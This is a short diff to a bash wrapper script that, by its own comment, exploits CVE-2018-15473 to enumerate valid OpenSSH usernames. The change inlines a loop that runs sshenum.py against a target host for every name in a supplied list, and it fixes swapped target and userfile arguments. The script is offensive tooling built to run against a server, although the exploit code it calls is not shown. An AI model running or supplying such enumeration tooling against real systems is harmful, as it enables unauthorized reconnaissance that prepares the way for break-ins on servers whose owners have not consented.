@@ -1,14 +1,6 @@
 #!/bin/bash
 # Exploits CVE-2018-15473 to enumerate OpenSSH usernames
 
-# Reads usernames from file and checks if name is valid
-
-function getuser() {
-	for i in $userfile; do
-		python sshenum.py $1 $i
-	done
-}
-
 # Help menu
 function help() {
 	echo usage: suf.sh target userfile
@@ -20,8 +12,10 @@ if [ $# -le 1 ]; then
 	exit 1
 fi
 
-userfile=$( cat $1 )
+userfile=$( cat $2 )
 
-echo "Checking $2 for valid users..."
+echo "Checking $1 for valid users..."
 sleep 3
-getuser $2
+for i in $userfile; do
+	python sshenum.py $1 $i
+done
